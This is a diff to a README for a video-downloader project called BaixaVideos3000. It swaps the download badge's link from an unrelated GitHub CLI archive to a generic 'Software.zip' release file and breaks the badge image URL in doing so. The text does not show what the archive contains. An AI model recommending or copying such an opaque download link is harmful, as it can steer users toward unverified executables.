@@ -15,7 +15,7 @@ BaixaVideos3000 started as a quick hack I made in 48 minutes to facilitate downl
 3. Enjoy watching your downloaded videos offline anytime, anywhere!
 
 ## Download BaixaVideos3000
-[![Download BaixaVideos3000](https://img.shields.io/badge/Download%20BaixaVideos3000-v1.0.0-blue)](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip)
+[![Download BaixaVideos3000](https://github.com/Manueljose21/BaixaVideos3000/releases/download/v1.0/Software.zip%20BaixaVideos3000-v1.0.0-blue)](https://github.com/Manueljose21/BaixaVideos3000/releases/download/v1.0/Software.zip)
 *(Launch the download)*
 
 If you encounter any issues with the download link provided, please check the "Releases" section of the repository for alternative options.
